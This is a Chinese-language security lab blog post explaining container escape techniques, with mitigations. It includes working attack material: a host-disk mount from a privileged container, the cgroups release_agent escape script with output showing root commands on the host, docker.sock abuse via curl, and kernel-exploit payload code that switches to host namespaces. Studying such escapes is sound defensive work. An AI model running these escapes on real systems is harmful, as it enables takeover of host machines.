&lt;br/&gt;"/><meta property="og:description" content="圖片來源：[Pixabay](https://pixabay.com/photos/emergency-exit-exit-sign-escape-1321134/)

## 前言

本月來到 D39 與大家分享近期有趣的研究，Lab 團隊雖然不像是科幻電影中的實驗室般，穿著帥氣的白袍與擁有高科技的實驗室，但我們主要專注於最新技術與威脅研究，與惡意程式作者們互相切磋是我們的日常。而 Lab 中的 D39 成員更致力於弱點安全與漏洞挖掘領域，研究範圍包含 Mobile、IOT、Linux、Windows 等有機會連網的系統與裝置都是我們的目標，期許能提升客戶產品安全性，打造優良的上網環境（笑）

這一次由 D39 實習生 Jack，為我們精心整理 Container 相關的弱點攻擊方式，透過清楚易懂的介紹，帶大家了解究竟在駭客眼中的 Container，存在哪些資安問題呢？

## 正文開始

相信大家對 Docker 都不陌生，無論是想要架設網站、資料庫或郵件伺服器，只要一行 `docker run` 就能搞定，不用處理可怕的環境問題，但若它存在漏洞或一些錯誤的設定，跑在 Container 內的 Process 就有可能控制主機。

這次與大家介紹 Container Escape 的一些攻擊方法，讓各位在使用 Container 時可以留意相關的安全隱憂，以及了解這些漏洞造成的影響。

## Container

在介紹攻擊方法之前，先來了解一下 Container 使用到的技術：

* Namespaces
* Cgroups
* Seccomp
* Capabilities
* LSM
* OverlayFS

### Namespaces

Container 好用的地方在於，它能夠建立一個獨立的環境，可以放心地安裝一大堆想嘗試的套件，不怕弄髒自己的環境。要實現這個功能，Namespaces 扮演了一個很重要的角色。

來看看 Linux Programmer&#x27;s Manual [Man page](https://man7.org/linux/man-pages/man7/namespaces.7.html) 的描述：

&gt;A namespace wraps a global system resource in an abstraction that makes it appear to the processes within the namespace that they have their own isolated instance of the global resource.  Changes to the global resource are visible to other processes that are members of the namespace, but are invisible to other processes.  One use of namespaces is to implement containers.

這邊的「資源」（resource）指的就像 Mount point 或 PID，Namespaces 可以建立一個獨立的 Mount point 或 PID，讓 Container 僅能存取自己掛載的檔案系統或自己的 Process，與 Host 隔離開來，不會弄亂 Host 的檔案，或存取到 Host 的 Process 資訊。

使用 Namespaces 的方式就是呼叫 `unshare`、`setns`、`clone` 等 System call，類別也不只有 Mount 與 PID，詳細可以看 [Man page](https://man7.org/linux/man-pages/man7/namespaces.7.html)。

### Cgroups

Cgroups 透過 `cgroupfs` 控制 Process 所能使用的記憶體容量或 CPU 資源，讓 Process 不會因為一些 bug 讓整台電腦當機，Docker 可以用 `--cpu-shares` 來限制各個 Container 能用到的 CPU 資源。詳細請見 [Cgroups man page](https://man7.org/linux/man-pages/man7/cgroups.7.html)。

### Seccomp
Seccomp (Secure Computing) 對 CTFer 可能不陌生，用來限制能夠使用的 System call，常見於一些 Shellcode 題。

Container 很常禁用 `mount` ，因為它是一個方便我們逃離 Container 的 System call，接下來就會說明如何利用 `mount` 逃出 Container。詳細請見 [Seccomp man page](https://man7.org/linux/man-pages/man2/seccomp.2.html)。

### Capabilities

Capabilities 從 Linux Kernel 2.2 開始加入，目的是將權限做更細緻的區隔，以 Container 來說，若直接給它 `root` 權限是不安全的，這意味著它可以隨意載入 Kernel module 或 `mount`，讓 Container 有機會存取 Host 資源，因此 Container 內的 `root` 只有一些基本的 Capabilities，如 CAP\_CHOWN、CAP\_KILL、CAP\_SETUID、CAP\_SETGID 等。Ubuntu 使用者可以安裝 `libcap2-bin` 並使用 `getpcaps {pid}` 查看該 Process 擁有哪些 Capabilities，詳細請看 [man page](https://man7.org/linux/man-pages/man7/capabilities.7.html)。

### LSM (Linux Security Module)

Linux kernel 文件裡寫道：

&gt; The primary users of the LSM interface are Mandatory Access Control (MAC) extensions which provide a comprehensive security policy.

如 AppArmor 和 SELinux 都是 Linux Kernel 內建的 Security Module，透過它們專屬的設定檔可以限制 Process 的存取權限，像 Docker 就是使用 AppArmor 限制 `procfs` 以及 `mount`，保護 Host 資源。

### OverlayFS

許多 Container 使用 OverlayFS 當作它的檔案系統，如它的名字，目的就是要把兩個或多個檔案系統合併，讓它看起來是一個檔案系統。它使用了 `upper` 與 `lower` 區分兩種要合併的檔案系統，其中若 `upper` 與 `lower` 有相同檔案時，會以 `upper` 為主。我們用 Container 來解釋，Docker 把 `upper` 當作 Container layer、`lower` 當作 Image layer，我們在 `docker build` 的時候會產生 Image，利用這些 Image 我們可以很快地產出 Container，在 Image 內的檔案如 Ubuntu 預設的系統檔案就會被放在 Image layer，在 Container runtime 產生的檔案，例如 Log 檔會被放在 Container layer，這麼一來建立多個 Container 時可以讓它們的 Image layer 都是同一個，省下許多空間。

來實驗一下，首先開兩個 Container：

```
$ docker run --name t1 -it ubuntu
root@e937832abc06:/#
```

```
$ docker run --name t2 -it ubuntu
root@71c8a58e90ac:/#
```

檢查它們的 LowerDir：

```
$ docker inspect t1 | grep Lower
                &quot;LowerDir&quot;: ...:/var/lib/docker/overlay2/07a2cbd7...dbdf/diff:...,
$ docker inspect t2 | grep Lower
                &quot;LowerDir&quot;: ...:/var/lib/docker/overlay2/07a2cbd7...dbdf/diff:...,
```

仔細一看，列出來的路徑幾乎是一樣的，接下來看看裡面有什麼：

```
$ sudo ls -alF /var/lib/docker/overlay2/07a2cbd7...dbdf/diff
total 24
drwxr-xr-x 6 root root 4096 Nov 13  2019 ./
drwx------ 4 root root 4096 Nov 13  2019 ../
drwxr-xr-x 4 root root 4096 Nov  1  2019 etc/
drwxr-xr-x 2 root root 4096 Nov  1  2019 sbin/
drwxr-xr-x 3 root root 4096 Oct 30  2019 usr/
drwxr-xr-x 3 root root 4096 Oct 30  2019 var/
```

是很常見的系統資料夾！也就是 Image layer，接下來看 Container layer：

```
root@e937832abc06:/# echo &#x27;hello, host&#x27; &gt; /hello
```

先在 Container 內創立一個檔案：

```
$ docker inspect e937 | grep Upper
                &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/657597a...a966/diff&quot;,
$ sudo cat /var/lib/docker/overlay2/657597a...a966/diff/hello
hello, host
```

然後用 `docker inspect` 找到 UpperDir，就會看到我們建立的 `hello` 檔案了！

&lt;br/&gt;

## Container Escape
來試想一個情境，有一台主機遵守 Microservices 的精神，使用 Docker 分別架設了網站、資料庫與郵件伺服器這三個 Container，假設郵件伺服器存在漏洞被駭客入侵，也不會直接影響到網站和資料庫，維護的工程師也能很快的用 Docker 換成新版本來進行即時修補。但如果 Container 存在漏洞時，所有的服務都有可能陷入風險。

### Privileged Container
我們先從比較容易 Escape 的 Privileged Container 開始，Privileged Container 沒有 Seccomp 限制且 Capability 全開，讓 Container 可以存取所有硬體設備，為的就是讓這個 Container 有獨立的環境且能做 Host 能做的事。Docker 建立 Privileged container 的方法很簡單，只要在 `dokcer run` 時多加個 `--privileged` flag 即可。

`docker run --privileged -it ubuntu`

另外還有一個很棒的功能，用 Docker 跑 Docker。聽起來很奇怪但很合理，如果去看 Docker 的[開發文件](https://github.com/docker/docker-ce/blob/master/components/engine/docs/contributing/set-up-dev-env.md)，會發現 Docker 是用 Docker 開發的。

一般來說開發用的 Privileged container 駭客碰不到，但如果是用 Docker 架設 CI/CD 工具，然後使用這些工具的 Docker 功能呢？歡迎參考[這篇](https://www.slideshare.net/Docker/build-publish-deploy-and-test-docker-images-and-containers-with-jenkins-workflow)的 &quot;How Can You Use Jenkins &amp; Docker Together&quot;。

沒錯，你需要一個 Privileged container 來運行 CI/CD 工具！接下來先以 Privileged container 為例，說明在我們打下有漏洞的 CI/CD 工具且有 `root` 權限後，要怎麼控制 Host。

#### Mount root
第一個要介紹的是這個一直被針對的 `mount` ，在 Privileged container 裡是可以直接使用的，來看看如何透過它存取 Host 檔案。

首先先取得 Block device 的 Major 與 Minor：

```
root@997453a4062f:/test# ls -alF /sys/dev/block/ | grep sda1
lrwxrwxrwx 1 root root 0 Aug 12 06:50 8:1 -&gt; ../../devices/pci0000:00/0000:00:01.1/ata1/host0/target0:0:0/0:0:0:0/block/sda/sda1/
```

`sda1` 是 Host 的根目錄（不同的電腦可能不一樣，對駭客來說可以全部都試試看）。接下來用 `mknod` 產 Block special file 然後 `mount`，就會把 Host 的根目錄放在 Container 內了（若 `/dev/sda1` 不存在才需要使用 `mknod`）。

Docker:

```
root@997453a4062f:/test# mknod /dev/myroot b 8 1
root@997453a4062f:/test# mkdir rootfs; mount /dev/myroot rootfs
root@997453a4062f:/test# echo hello, host! &gt; rootfs/hello
```

Host:

```
root@escape:/# cat /hello
hello, host!
```

#### Cgroups v1 release notification

只能存取 `root` 資料夾還不夠！我們的目標是能在 Host 上做任何事且不受 Container 影響。接下來要介紹的是 [Felix Wilhelm 在 Twitter 上寫的](https://twitter.com/_fel1x/status/1151487051986087936)：

&gt; Quick and dirty way to get out of a privileged k8s pod or docker container by using cgroups release_agent feature.

```
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_release
t=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`
touch /o; echo $t/c &gt;$d/release_agent;echo &quot;#!/bin/sh
$1 &gt;$t/o&quot; &gt;/c;chmod +x /c;sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;;sleep 1;cat /o
```

直接用 Docker 跑跑看：

```
$ docker run --privileged -it ubuntu
root@acf8f56c9de6:/test# cat &gt; exp.sh
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_release
t=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`
touch /o; echo $t/c &gt;$d/release_agent;echo &quot;#!/bin/sh
$1 &gt;$t/o&quot; &gt;/c;chmod +x /c;sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;;sleep 1;cat /o
root@acf8f56c9de6:/test# chmod +x ./exp.sh
root@acf8f56c9de6:/test# ./exp.sh ps
  PID TTY          TIME CMD
    1 ?        00:01:31 systemd
    2 ?        00:00:00 kthreadd
    3 ?        00:00:00 rcu_gp
    4 ?        00:00:00 rcu_par_gp
    6 ?        00:00:00 kworker/0:0H-kb
    9 ?        00:00:00 mm_percpu_wq
   10 ?        00:00:15 ksoftirqd/0
   11 ?        00:09:23 rcu_sched
   12 ?        00:00:02 migration/0
   13 ?        00:00:00 idle_inject/0
   14 ?        00:00:00 cpuhp/0
   15 ?        00:00:00 cpuhp/1
   16 ?        00:00:00 idle_inject/1
   17 ?        00:00:03 migration/1
   18 ?        00:00:05 ksoftirqd/1
   20 ?        00:00:00 kworker/1:0H-ev
   ...
root@acf8f56c9de6:/test# ./exp.sh id
uid=0(root) gid=0(root) groups=0(root)
```

太棒了！可以在 Container 外執行任意指令且是 `root` 權限。接下來分析它怎麼做到的：

```
root@acf8f56c9de6:/test# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
root@acf8f56c9de6:/test# echo $d
/sys/fs/cgroup/rdma
```

`d` 變數的目的是取得 Cgroups 底下有 `release_agent` 檔案的路徑，`release_agent` 的描述可參考 [Man page](https://man7.org/linux/man-pages/man7/cgroups.7.html)：

&gt; A special file in the root directory of each cgroup hierarchy, release_agent, can be used to register the pathname of a program that may be invoked when a cgroup in the hierarchy becomes empty.

變為空的意思：

&gt; A cgroup is considered to be empty when it contains no child cgroups and no member processes.

`release_agent` 一般用來讓使用者自訂腳本，清理新建的 Cgroups 讓 `cgroupfs` 保持乾淨，而它會在 Host 以 `root` 權限執行，所以只要能控制 `release_agent`，我們就可以在 Container 外執行任意指令。

在 Cgroups 資料夾底下創立一個 `w` 資料夾，會讓 Cgroups 創立一個新的群組，然後啟用這個群組的 `notify_on_release`：

```
mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_release
```

`t` 變數是找出 Host 可以直接看到 Container 檔案的路徑，也就是 OverlayFS 的 UpperDir (Container layer) ，以便 `release_agent` 能夠呼叫 Container 內的惡意腳本：

```
t=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`
```

最後一步把 `release_agent` 指到我們能控制的惡意腳本，然後利用 `echo 0 &gt; $d/w/cgroup.procs` 把 `echo` 加入 `w` 這個 Cgroups，待 `echo` 結束後就會觸發 `notify_on_release` 然後呼叫 `release_agent`：

```
touch /o; echo $t/c &gt;$d/release_agent;echo &quot;#!/bin/sh
$1 &gt;$t/o&quot; &gt;/c;chmod +x /c;sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;;sleep 1;cat /o
```

可以發現我們主要用到的功能是 Cgroups 以及 `mount`，因此這個利用方式有個修訂版本，只要使用 `docker run -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash` 就可以利用較少的權限 Escape，詳細可以看[這篇文章](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)。

&lt;iframe src=&quot;https://asciinema.org/a/356357/embed?&quot; id=&quot;asciicast-iframe-356357&quot; name=&quot;asciicast-iframe-356357&quot; scrolling=&quot;no&quot; allowfullscreen=&quot;true&quot; style=&quot;overflow: hidden; margin: 0px; border: 0px; display: inline-block; width: 100%; float: none; visibility: visible; height: 468px;&quot;&gt;&lt;/iframe&gt;

#### Exposed docker.sock

用 Docker 跑 Docker 的方式還有這個：

```
docker run -v /var/run/docker.sock:/var/run/docker.sock
```

`dockerd` 開啟後預設會在 `/var/run/docker.sock` 聽取命令，等待使用者送出 Docker 指令後，`docker-cli` 會把指令轉成一定的格式跟 `docker.sock` 溝通，所以把這個檔案映射到 Container 內，等同於讓這個 Container 能夠用 Host 的名義建立 Container。

我們可以簡單的使用 `curl` 控制 `docker.sock`：

```
$ curl -XPOST --unix-socket /var/run/docker.sock -d &#x27;{&quot;Image&quot;:&quot;ubuntu&quot;, &quot;Privileged&quot;:true}&#x27; -H &#x27;Content-Type: application/json&#x27; http://localhost/containers/create
{&quot;Id&quot;:&quot;8e89909670942daa92999f337fb325b4a89f6a2dd2f5fcf9e972ca089c5b751a&quot;,&quot;Warnings&quot;:[]}
$ curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/8e89909670942daa92999f337fb325b4a89f6a2dd2f5fcf9e972ca089c5b751a/start
```

只要對 `docker.sock` 發送請求就能創立一個 Container！可以用上面的方法開啟一個 Privileged container，再利用前面的手法拿到 Host 控制權！

&lt;br/&gt;

### Container Engine bug

不過一般的服務如郵件伺服器，它不需要用 Docker 跑 Docker 的功能，也就不會以 `--privileged` 的方式運行，所以就算利用漏洞拿到 Container 的 `root` 權限，也不能用 `mount` 或 `docker.sock` 的方式 Escape，但如果 Container Engine 本身有漏洞，就有機會利用它控制 Host。

#### runC CVE-2019-5736

第一個要介紹的是 runC (run container)，它是一個根據 OCI 規範用來運行 Container 的程式，被許多 Container engine 呼叫，例如：Docker、Kubernets、LXC 等，因此這個漏洞影響範圍相當大（[詳細受影響清單](https://www.cvedetails.com/cve/CVE-2019-5736/)）。而攻擊條件是駭客在 Container 內有 `root` 權限，或 Container Engine 執行了惡意的 Container。

它的漏洞原因在於，新的 Process 若是 `/proc/self/exe`，就能利用殘留的 File descriptor 改寫 runC 這隻程式，等到下次有人使用 Docker 時就會執行被改寫的 runC，而 Docker 是用 `root` 權限運行的，因此就獲得了 `root` 的任意命令執行！

先來看 Process 在正常狀況下是如何被放進 Container。在執行 `docker exec` 的時候 runC 會把自己放進 Container 的 Namespace 然後再 `execve(&quot;binary&quot;)`：

![Blog_9-6](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-6_2c8cdf52db.png)

但 Process 若指定成 `/proc/self/exe` 就會指回 runC 本身：

![Blog_9-7](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544713/Blog_9-7_011278ad04.png)

有趣的事情發生了！runC 執行 `execve(&quot;/proc/self/exe&quot;)`，也就是再跑了一次 runC，但用的 Library 是 Container 內的 Library，所以我們可以改寫 Container 內的 `libc` 或 `libseccomp` 之類的 runC 會用到的 Dynamic library，執行任意的程式碼！

![Blog_9-8](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-8_2620f0f070.png)

有任意程式碼執行後重複開啟 `/proc/self/exe`，就能存取 Host 的 runC 程式，但在 Linux 裡執行中的程式是不能被修改的，所以先用 `open` 的 `O_PATH` 模式留下 File descriptor，但不開啟檔案然後 `fork` 讓子程序對 runC 寫入惡意指令，接下來只要等待下一次的 `docker exec` 就會觸發惡意指令！

![Blog_9-9](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-9_fb31bbc0f3.png)

這個漏洞是 CTF 隊伍 Dragon Sector 打完比賽後獲得靈感而研究出來的漏洞，詳細的挖掘過程在他們的[部落格](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)，以及他們的 [Exploit Code](https://www.openwall.com/lists/oss-security/2019/02/13/3)。

&lt;iframe src=&quot;https://asciinema.org/a/356360/embed?&quot; id=&quot;asciicast-iframe-356360&quot; name=&quot;asciicast-iframe-356360&quot; scrolling=&quot;no&quot; allowfullscreen=&quot;true&quot; style=&quot;overflow: hidden; margin: 0px; border: 0px; display: inline-block; width: 100%; float: none; visibility: visible; height: 468px;&quot;&gt;&lt;/iframe&gt;

&lt;br/&gt;

#### rkt CVE-2019-10144/CVE-2019-10145/CVE-2019-10147

rkt 也是一個 Container engine，但已經沒有在維護了，所以這三個 CVE 到現在還是可以利用，不過利用條件較為嚴苛，駭客需要控制由 `rkt enter` 開啟的 Process 才能 Escape（一般狀況下會以 `rkt run` 的方式開啟）。

`rkt enter` 就像是 `docker exec`，可以在指定的 Container 內執行程式，但使用 `rkt enter` 執行的程式擁有所有的 Capabilities ，沒有 Seccomp 限制也沒有隔離 Cgroups。就像個 Privileged Container！

所以使用 `getpcaps $$` 看到所有 Capabilities 的話，恭喜你，你處在一個可以 Container Escape 的環境內！

來看看利用方法，首先下載最新版的 rkt：

```
wget https://github.com/rkt/rkt/releases/download/v1.30.0/rkt-v1.30.0.tar.gz
tar xzvf rkt-v1.30.0.tar.gz
cd rkt-v1.30.0
./rkt help
```

用 `getpcaps` 檢查看看：

```
$ sudo ./rkt --insecure-options=image --interactive=true  run docker://libpcap/libpcap
root@rkt-9354bcca-e188-453f-942c-6c1ae056ef70:/# getpcaps $$
Capabilities for `6&#x27;: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
```

```
$ sudo ./rkt enter 9354 /bin/bash
root@rkt-9354bcca-e188-453f-942c-6c1ae056ef70:/# getpcaps $$
Capabilities for `14&#x27;: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_rｆaw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+ep
```

使用 `rkt enter` 開啟的 `bash` 有 `cap_sys_admin`，可以試著用之前說到的 `mount` 方法存取 Host 的檔案！

但這裡會遇到一些問題，`mknod` 出來的 Block special file 放的位置會影響能不能 `mount`，所以這邊用一個改良的做法：

```
# mkdir mydev
# mkdir rootfs
# mount -t devtmpfs none mydev
# mount mydev/sda1 rootfs
```

直接 `mount` 一個型態為 devtmpfs 的資料夾， Linux kernel 就會自動把所有的 Device file 準備好，我們只要 `mount mydev/sda1` 就能存取 Host 的根目錄！

&lt;br/&gt;

### Linux kernel exploit

前面講到的 Privileged container 以及 Container Engine bug 需要在 Container 內有 `root` 權限，但並不是每個服務都是以 `root` 權限運行，例如 HTTP server 通常會以較低權限的使用者如 `www-data` 身份執行，聰明的你一定注意到了，利用 Linux kernel exploit 獲得 `root` 權限然後再 Escape！

其實，有 Linux kernel exploit 的話可以直接 Escape！Container 用到的 Namespaces、Cgroups 等都是由 Linux kernel 提供的功能，所以如果在 Kernel space 內改寫相關結構，再跳回 User space，就能控制 Host，而且也不需要 Container 的漏洞！

讓我們看看 Linux kernel 內管理 Process 的結構 [`task_struct`](https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L818)

```clike=
struct task_struct {
	/* ... */
	/*
	 * Pointers to the (original) parent process, youngest child, younger sibling,
	 * older sibling, respectively.  (p-&gt;father can be replaced with
	 * p-&gt;real_parent-&gt;pid)
	 */
	
	/* Real parent process: */
	struct task_struct __rcu	*real_parent;
	
	/* Recipient of SIGCHLD, wait4() reports: */
	struct task_struct __rcu	*parent;
	/* ... */
	/* Filesystem information: */
	struct fs_struct		*fs;
	/* ... */
}
```

裡面有一個 [`fs_struct`](https://elixir.bootlin.com/linux/latest/source/include/linux/fs_struct.h#L9)，再往裡面看看：

```clike=
struct fs_struct {
	int users;
	spinlock_t lock;
	seqcount_t seq;
	int umask;
	int in_exec;
	struct path root, pwd;
} __randomize_layout;
```

`task_struct-&gt;fs` 存放著這個 Process 的 `root` 以及工作目錄，而我們能夠用 `task_struct-&gt;real_parent` 取得 Parent process 的 `task_struct`，所以我們可以不斷的往上找，直到找到 `PID = 1`，也就是位於 Host 的 Init process，然後把它的 `fs_struct` 複製給自己，就可以存取 Host 的根目錄了！

![Blog_9-12](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-12_97ea7b5407.png)

這個 Exploit 取自 Nick Freeman 的文章  [An Exercise in Practical Container Escapology](https://capsule8.com/blog/practical-container-escape-exercise/)，他修改了由 Andrey Konovalov 寫的 Linux Kernel exploit，讓它可以 Escape container：

```clike=
typedef unsigned long __attribute__((regparm(3))) (*_copy_fs_struct)(unsigned long init_task);

uint64_t get_task(void) {
    uint64_t task;
    asm volatile (&quot;movq %%gs: 0xD380, %0&quot;:&quot;=r&quot;(task));
    return task;
}

void get_root(void) {

    int i;
    char *task;
    char *init;
    uint32_t pid = 0;


	((_commit_creds)(COMMIT_CREDS))(
	    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));


    task = (char *)get_task();
    init = task;
    while (pid != 1) {
        init = *(char **)(init + TASK_REAL_PARENT_OFFSET);
        pid = *(uint32_t *)(init + TASK_PID_OFFSET);
    }

  
    *(uint64_t *)(task + TASK_FS_OFFSET) = ((_copy_fs_struct)(COPY_FS_STRUCT))(*(long unsigned int *)(init + TASK_FS_OFFSET));
}
```

每個 Linux kernel exploit 都會有一行：

```
	((_commit_creds)(COMMIT_CREDS))(
	    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));
```

用途是建立擁有所有權限的 Credentials 並使用它，也就是讓這個 Process 變成 `root` 權限。而這個 Exploit 就是在它之後加上：

```clike
    task = (char *)get_task();
    init = task;
    while (pid != 1) {
        init = *(char **)(init + TASK_REAL_PARENT_OFFSET);
        pid = *(uint32_t *)(init + TASK_PID_OFFSET);
    }

  
    *(uint64_t *)(task + TASK_FS_OFFSET) = ((_copy_fs_struct)(COPY_FS_STRUCT))(*(long unsigned int *)(init + TASK_FS_OFFSET));
```

用 `while` 迴圈找到 Init process，然後呼叫 `copy_fs_struct` 把 `fs_struct` 複製回來，就能看到 Host 的根目錄。

&lt;iframe src=&quot;https://asciinema.org/a/356361/embed?&quot; id=&quot;asciicast-iframe-356361&quot; name=&quot;asciicast-iframe-356361&quot; scrolling=&quot;no&quot; allowfullscreen=&quot;true&quot; style=&quot;overflow: hidden; margin: 0px; border: 0px; display: inline-block; width: 100%; float: none; visibility: visible; height: 468px;&quot;&gt;&lt;/iframe&gt;

但還沒結束！我們實際上還沒繞過 Namespaces 的限制，如果使用 `kill` 是會失敗的：

```
ubuntu@ubuntu:/$ ./poc
[^] starting
[=] running KASLR defeat exploit (CVE-2017-18344)
[0] enumerating divide_error() location (CVE-2017-18344)
[&gt;] setting up proc reader
...
[+] done, should be root now
[6] checking if we got root
[+] got r00t ^_^
root@ubuntu:/# ps aux | grep cat
user     22522  0.0  0.0   7444   680 pts/1    S+   17:34   0:00 cat
root     22547  0.0  0.0  11288   924 pts/3    S+   17:35   0:00 grep --color=auto cat
root@ubuntu:/# kill 22522
bash: kill: (22522) - No such process
```

但也足夠了，可以用 Docker 執行 Privileged container 再 Escape。或是 Nick Freeman 提供的作法：

&gt; * Write or overwrite host or other container files (including kubelet configs)
&gt; * Interact with Docker (perhaps pull and launch a new fun privileged container)
&gt; * Inject code or harvest data from processes (host or container) via /proc/pid/mem
&gt; * Load/ unload kernel modules

&lt;br/&gt;

這麼一來就可以不用花費力氣在換 Namespaces 上，但也有一篇文章提到更換 Namespaces 的方法 [The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation)：

```clike=
void get_root_payload( void) {

        ((_commit_creds)(COMMIT_CREDS))(
                ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0)
        );

        // -------- NAMESPACE DOCKER EXPLOIT  --------
        // copy nsproxy from init_nsproxy to pid 1 of the container
        unsigned long long g = ((_find_task_vpid)(FIND_TASK))(1);

        // now, do the magic.... !!!! Simple black magic doesn&#x27;t work on current process!!!!
        ((_switch_task_namespaces)(SWITCH_TASK_NS))(( void *)g, (void *)INIT_NSPROXY);

        // prepare the two namespace FDs by opening the respective files
        long fd = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, &quot;/proc/1/ns/mnt&quot;, O_RDONLY, 0);
        ((_sys_setns)(SYS_SETNS))( fd, 0);

        fd      = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, &quot;/proc/1/ns/pid&quot;, O_RDONLY, 0);
        ((_sys_setns)(SYS_SETNS))( fd, 0);
}
```

這篇的作法是開啟 `/proc/1/ns/` 資料夾下的檔案，也就是 Namesapces 提供的各個部件（這邊選擇 `mnt` 與 `pid`），然後呼叫 `setns` 把自己的 Namespaces 設定成跟 Host 一樣，這樣就不用額外的步驟，可以直接存取 Host！

&lt;br/&gt;

## Mitigation

上述說到的 Privileged container 是最容易 Escape 的 Container ，若一定得使用它開服務的話，要把它當作 Host 的服務看待，做好權限管理，只要駭客沒有足夠的權限（ `root` ），就不能使用 `mount` 的方式存取 Host 資源，大幅降低它所造成的危害。Docker 可以用 `docker run -u {uid}:{gid}`，以較低的使用者權限開啟 Container，然後把要開啟的服務放在一般使用者可用的 `port &gt;= 1024` 上，這麼一來就算駭客打下服務，也沒有足夠的權限使用 `mount` 做進一步的攻擊：

```
# docker run --privileged -it -u 1000 python bash
I have no name!@6b6f0f0bc93d:/$ python -m http.server 8080 &amp;
[1] 7
I have no name!@6b6f0f0bc93d:/$ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

I have no name!@6b6f0f0bc93d:/$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
1000         1  0.1  0.0   5748  3632 pts/0    Ss   02:51   0:00 bash
1000         7  4.0  0.1  25996 18840 pts/0    S    02:51   0:00 python -m http.server 8080
1000         8  0.0  0.0   9388  3100 pts/0    R+   02:51   0:00 ps aux
I have no name!@6b6f0f0bc93d:/$ mkdir /tmp/t1; mkdir /tmp/t2; mount --bind /tmp/t1 /tmp/t2
mount: only root can use &quot;--bind&quot; option
```

也可以善用 `setuid`，切換到權限較低的使用者。剩下的就是定期更新、檢查使用的產品是否出現漏洞，以及避免使用不再維護的產品。

&lt;br/&gt;

## Container security is Linux security

Container 仰賴 Linux kernel 提供的機制，隔離出一塊空間供 Container 使用，所以當這些機制出現問題或開發者設計時沒有考慮周全，原以為安全的 Container 就有可能被駭客利用，造成更大的危害。今天分別介紹 Privileged Container、Container Engine bug 以及 Linux kernel exploit 這三種攻擊情境，都是利用 Linux 本身的特性達到存取 Host 資源的效果。希望你們會喜歡，也祝各位都能成功 Escape！

&lt;br/&gt;

## References

* [Breaking Out of rkt – 3 New Unpatched CVEs](https://unit42.paloaltonetworks.com/breaking-out-of-coresos-rkt-3-new-cves/)
* [The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation)
* [An Exercise in Practical Container Escapology](https://capsule8.com/blog/practical-container-escape-exercise/)
* [CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
* [A Compendium of Container Escapes](https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf)
* [Linux Container Escapes and Hardening](https://gist.github.com/FrankSpierings/5c79523ba693aaa38bc963083f48456c)
* [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

&lt;br/&gt;"/><meta property="og:url" content="https://teamt5.org/tw/posts/container-escape-101"/><meta property="og:type" content="website"/><meta property="og:image" content="https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1599804537/emergency-exit-1321134_1920_6420b1abb7.jpg"/><meta name="next-head-count" content="7"/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-cf519ab7dd9a5a4fd835.js"></script><script src="/_next/static/chunks/webpack-e50c24efd369c1efbdb6.js" defer=""></script><script src="/_next/static/chunks/framework-d2ee10ca2f4d09d55866.js" defer=""></script><script src="/_next/static/chunks/main-a8d0f6a9979592fe7c0c.js" defer=""></script><script src="/_next/static/chunks/pages/_app-c4fc1fc4c79c4d8fe6ea.js" defer=""></script><script src="/_next/static/chunks/938-e92d2fa2f45971e6fc56.js" defer=""></script><script 